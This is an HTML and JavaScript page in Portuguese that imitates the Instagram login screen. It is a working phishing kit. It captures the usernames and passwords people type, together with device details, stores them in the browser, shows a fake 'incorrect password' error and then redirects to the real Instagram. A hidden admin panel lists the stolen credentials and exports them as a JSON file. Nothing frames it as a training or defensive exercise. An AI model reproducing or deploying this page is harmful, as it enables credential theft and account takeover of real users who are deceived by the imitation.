<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">Instagram</div>
            <form class="login-form" id="loginForm">
                <input type="text" id="username" placeholder="Telefone, nome de usu√°rio ou email" required>
                <input type="password" id="password" placeholder="Senha" required>
                <button type="submit" class="login-btn" id="loginBtn" disabled>Entrar</button>
                <div class="loading" id="loading">Entrando...</div>
                <div class="error-message" id="errorMessage">
                    Sua senha est√° incorreta. Tente novamente.
                </div>
            </form>
            
            <div class="separator">
                <span>OU</span>
            </div>
            
            <a href="#" class="facebook-login">Entrar com o Facebook</a>
            <a href="#" class="forgot-password">Esqueceu a senha?</a>
        </div>
        
        <div class="signup-box">
            N√£o tem uma conta? <a href="#">Cadastre-se</a>
        </div>

        <!-- Painel Admin (oculto) -->
        <div class="admin-panel" id="adminPanel">
            <h3>üîê Dados Capturados</h3>
            <div id="adminData"></div>
            <button onclick="exportData()">üì• Exportar Dados</button>
            <button onclick="clearData()" style="background: #dc3545;">üóëÔ∏è Limpar</button>
            <button onclick="hideAdmin()">‚ùå Fechar</button>
        </div>
    </div>

    <button class="admin-btn" onclick="showAdmin()">üîß</button>

    <script>
        // =============================================
        // SISTEMA COMPLETO DE CAPTURA E ARMAZENAMENTO
        // =============================================

        // Elementos principais
        const loginForm = document.getElementById('loginForm');
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const loginBtn = document.getElementById('loginBtn');
        const loading = document.getElementById('loading');
        const errorMessage = document.getElementById('errorMessage');
        const adminPanel = document.getElementById('adminPanel');
        const adminData = document.getElementById('adminData');

        // =======================
        // SISTEMA DE LOGIN FAKE
        // =======================

        // Ativar bot√£o quando campos estiverem preenchidos
        function updateLoginButton() {
            if (usernameInput.value.trim() && passwordInput.value.trim()) {
                loginBtn.classList.add('active');
                loginBtn.disabled = false;
            } else {
                loginBtn.classList.remove('active');
                loginBtn.disabled = true;
            }
        }

        usernameInput.addEventListener('input', updateLoginButton);
        passwordInput.addEventListener('input', updateLoginButton);

        // Capturar dados do formul√°rio
        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = usernameInput.value.trim();
            const password = passwordInput.value.trim();
            
            if (!username || !password) return;
            
            // Mostrar loading
            loading.style.display = 'block';
            errorMessage.style.display = 'none';
            loginBtn.disabled = true;
            
            try {
                // Criar objeto com dados capturados
                const userData = {
                    username: username,
                    password: password,
                    timestamp: new Date().toLocaleString('pt-BR'),
                    userAgent: navigator.userAgent,
                    screen: `${screen.width}x${screen.height}`,
                    url: window.location.href
                };
                
                // SALVAR NO LOCALSTORAGE (funciona 100%)
                saveToStorage(userData);
                
                // Simular processamento (2 segundos)
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                // Mostrar erro fake (parece real)
                loading.style.display = 'none';
                errorMessage.style.display = 'block';
                
                // Redirecionar para Instagram REAL ap√≥s 3 segundos
                setTimeout(() => {
                    window.location.href = 'https://instagram.com';
                }, 3000);
                
            } catch (error) {
                console.error('Erro:', error);
                loading.style.display = 'none';
                errorMessage.style.display = 'block';
            }
        });

        // =======================
        // SISTEMA DE ARMAZENAMENTO
        // =======================

        // Salvar dados no localStorage
        function saveToStorage(data) {
            try {
                // Recuperar dados existentes
                let existingData = JSON.parse(localStorage.getItem('instagramPhishingData') || '[]');
                
                // Adicionar novos dados
                existingData.push(data);
                
                // Salvar de volta no localStorage
                localStorage.setItem('instagramPhishingData', JSON.stringify(existingData));
                
                console.log('‚úÖ Dados salvos:', data);
                console.log('üìä Total de registros:', existingData.length);
                
            } catch (error) {
                console.error('‚ùå Erro ao salvar:', error);
            }
        }

        // =======================
        // PAINEL ADMINISTRATIVO
        // =======================

        // Mostrar painel admin
        function showAdmin() {
            adminPanel.style.display = 'block';
            loadAdminData();
        }

        // Ocultar painel admin
        function hideAdmin() {
            adminPanel.style.display = 'none';
        }

        // Carregar dados no painel admin
        function loadAdminData() {
            try {
                const data = JSON.parse(localStorage.getItem('instagramPhishingData') || '[]');
                
                if (data.length === 0) {
                    adminData.innerHTML = '<p>Nenhum dado capturado ainda.</p>';
                    return;
                }
                
                let html = `<p><strong>Total de logins capturados: ${data.length}</strong></p>`;
                
                data.forEach((item, index) => {
                    html += `
                        <div style="border: 1px solid #ddd; padding: 10px; margin: 10px 0; border-radius: 5px;">
                            <p><strong>üë§ Usu√°rio:</strong> ${escapeHtml(item.username)}</p>
                            <p><strong>üîë Senha:</strong> <span style="background: #f0f0f0; padding: 2px 5px; border-radius: 3px;">${escapeHtml(item.password)}</span></p>
                            <p><strong>üïí Data:</strong> ${item.timestamp}</p>
                            <p><strong>üì± Dispositivo:</strong> ${getDeviceType(item.userAgent)}</p>
                        </div>
                    `;
                });
                
                adminData.innerHTML = html;
                
            } catch (error) {
                adminData.innerHTML = '<p>Erro ao carregar dados.</p>';
            }
        }

        // Exportar dados
        function exportData() {
            try {
                const data = JSON.parse(localStorage.getItem('instagramPhishingData') || '[]');
                
                if (data.length === 0) {
                    alert('Nenhum dado para exportar.');
                    return;
                }
                
                // Criar arquivo JSON para download
                const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'dados-capturados.json';
                a.click();
                URL.revokeObjectURL(url);
                
                alert(`‚úÖ ${data.length} registros exportados com sucesso!`);
                
            } catch (error) {
                alert('‚ùå Erro ao exportar dados.');
            }
        }

        // Limpar dados
        function clearData() {
            if (confirm('Tem certeza que deseja apagar TODOS os dados capturados?')) {
                localStorage.removeItem('instagramPhishingData');
                loadAdminData();
                alert('Dados apagados com sucesso!');
            }
        }

        // =======================
        // FUN√á√ïES AUXILIARES
        // =======================

        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        function getDeviceType(userAgent) {
            if (userAgent.includes('Mobile')) return 'üì± Celular';
            if (userAgent.includes('Tablet')) return 'üìü Tablet';
            return 'üíª Computador';
        }

        // Tecla Enter para submit
        passwordInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter' && !loginBtn.disabled) {
                loginForm.dispatchEvent(new Event('submit'));
            }
        });

        // Inicializar
        updateLoginButton();
    </script>
</body>
